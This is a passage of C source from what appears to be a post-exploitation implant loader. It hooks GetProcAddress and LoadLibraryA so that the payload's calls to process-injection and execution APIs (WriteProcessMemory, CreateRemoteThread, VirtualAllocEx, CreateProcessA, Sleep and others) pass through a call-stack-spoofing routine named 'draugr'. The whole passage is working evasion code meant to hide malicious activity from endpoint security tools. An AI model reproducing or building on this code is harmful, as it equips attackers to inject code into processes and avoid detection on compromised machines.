    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesRead);

	return (BOOL)draugr(&call);
}

BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)
{
    #if DEBUG
    dprintf("[POSTEX] _WriteProcessMemory\n");
    dprintf(" -> hProcess               : 0x%lp\n", hProcess);
    dprintf(" -> lpBaseAddress          : 0x%lp\n", lpBaseAddress);
    dprintf(" -> lpBuffer               : 0x%lp\n", lpBuffer);
    dprintf(" -> nSize                  : %d\n", nSize);
    dprintf(" -> lpNumberOfBytesWritten : 0x%lp\n", lpNumberOfBytesWritten);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(WriteProcessMemory);
	call.argc     = 5;
	call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesWritten);

	return (BOOL)draugr(&call);
}

DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
{
    #if DEBUG
    dprintf("[POSTEX] _ExitThread\n");
    dprintf(" -> dwExitCode : %d\n", dwExitCode);
    #endif

	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(g_ExitThread);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(dwExitCode);

	draugr(&call);
}

BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateProcessA\n");
    dprintf(" -> lpApplicationName    : %s\n", lpApplicationName);
    dprintf(" -> lpCommandLine        : %s\n", lpCommandLine);
    dprintf(" -> lpProcessAttributes  : 0x%lp\n", lpProcessAttributes);
    dprintf(" -> lpThreadAttributes   : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> bInheritHandles      : %d\n", bInheritHandles);
    dprintf(" -> dwCreationFlags      : %d\n", dwCreationFlags);
    dprintf(" -> lpEnvironment        : 0x%lp\n", lpEnvironment);
    dprintf(" -> lpCurrentDirectory   : %s\n", lpCurrentDirectory);
    dprintf(" -> lpStartupInfo        : 0x%lp\n", lpStartupInfo);
    dprintf(" -> lpProcessInformation : 0x%lp\n", lpProcessInformation);
    #endif

    FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(CreateProcessA);
	call.argc     = 10;
	call.args[0]  = (ULONG_PTR)(lpApplicationName);
    call.args[1]  = (ULONG_PTR)(lpCommandLine);
    call.args[2]  = (ULONG_PTR)(lpProcessAttributes);
    call.args[3]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[4]  = (ULONG_PTR)(bInheritHandles);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpEnvironment);
    call.args[7]  = (ULONG_PTR)(lpCurrentDirectory);
    call.args[8]  = (ULONG_PTR)(lpStartupInfo);
    call.args[9]  = (ULONG_PTR)(lpProcessInformation);

	return (BOOL)draugr(&call);
}

VOID WINAPI _Sleep(DWORD dwMilliseconds)
{
    #if DEBUG
    dprintf("[POSTEX] _Sleep\n");
    dprintf(" -> dwMilliseconds : %d\n", dwMilliseconds);
    #endif

    /* only stack spoof if sleep is >= 1s */
    if (dwMilliseconds < 1000) {
        Sleep(dwMilliseconds);
        return;
    }
    
	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(Sleep);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(dwMilliseconds);
    
	draugr(&call);
}

HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName)
{
	FUNCTION_CALL call;
	memset(&call, 0, sizeof(FUNCTION_CALL));

	call.function = (PVOID)(LoadLibraryA);
	call.argc     = 1;
	call.args[0]  = (ULONG_PTR)(lpLibFileName);

	return (HMODULE)draugr(&call);
}

char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	char * result = (char *)GetProcAddress(hModule, lpProcName);

    /*
    * Check to see what function is being resolved.
    * Note that lpProcName may be an ordinal, not a string.
    */

    if ((ULONG_PTR)lpProcName >> 16 == 0) {
        /* it's an ordinal */
        return result;
    }

    /* Look at the ones we want to hook */

    /* Calculte function hash */
    DWORD h = hash((char *)lpProcName);

	if (h == GETPROCADDRESS_HASH) {
		return (char *)_GetProcAddress;
	}
    else if (h == LOADLIBRARYA_HASH) {
        return (char *)_LoadLibraryA;
    }
    else if (h == VIRTUALALLOC_HASH) {
        return (char *)_VirtualAlloc;
    }
    else if (h == VIRTUALALLOCEX_HASH) {
        return (char *)_VirtualAllocEx;
    }
    else if (h == VIRTUALPROTECT_HASH) {
        return (char *)_VirtualProtect;
    }
    else if (h == VIRTUALPROTECTEX_HASH) {
        return (char *)_VirtualProtectEx;
    }
    else if (h == VIRTUALFREE_HASH) {
        return (char *)_VirtualFree;
    }
    else if (h == GETTHREADCONTEXT_HASH) {
        return (char *)_GetThreadContext;
    }
    else if (h == SETTHREADCONTEXT_HASH) {
        return (char *)_SetThreadContext;
    }
    else if (h == RESUMETHREAD_HASH) {
        return (char *)_ResumeThread;
    }
    else if (h == CREATETHREAD_HASH) {
        return (char *)_CreateThread;
    }
    else if (h == CREATEREMOTETHREAD_HASH) {
        return (char *)_CreateRemoteThread;
    }
    else if (h == OPENPROCESS_HASH) {
        return (char *)_OpenProcess;
    }
    else if (h == OPENTHREAD_HASH) {
        return (char *)_OpenThread;
    }
    else if (h == CLOSEHANDLE_HASH) {
        return (char *)_CloseHandle;
    }
    else if (h == CREATEFILEMAPPINGA_HASH) {
        return (char *)_CreateFileMappingA;
    }
    else if (h == MAPVIEWOFFILE_HASH) {
        return (char *)_MapViewOfFile;
    }
    else if (h == UNMAPVIEWOFFILE_HASH) {
        return (char *)_UnmapViewOfFile;
    }
    else if (h == VIRTUALQUERY_HASH) {
        return (char *)_VirtualQuery;
    }
    else if (h == DUPLICATEHANDLE_HASH) {
        return (char *)_DuplicateHandle;
    }
    else if (h == READPROCESSMEMORY_HASH) {
        return (char *)_ReadProcessMemory;
    }
    else if (h == WRITEPROCESSMEMORY_HASH) {
        return (char *)_WriteProcessMemory;
    }
    else if (h == EXITTHREAD_HASH) {
        g_ExitThread = result;
        return (char *)_ExitThread;
    }
    else if (h == CREATEPROCESSA_HASH) {
        return (char *)_CreateProcessA;
    }
    else if (h == SLEEP_HASH) {
        return (char *)_Sleep;
    }

    return result;
}

void go(IMPORTFUNCS * funcs, char * dllBase, DWORD dllsz)
{
	funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *)_LoadLibraryA;
	funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;

    g_dllBase = dllBase;
	g_dllSize = dllsz;

	init_frame_info();
}
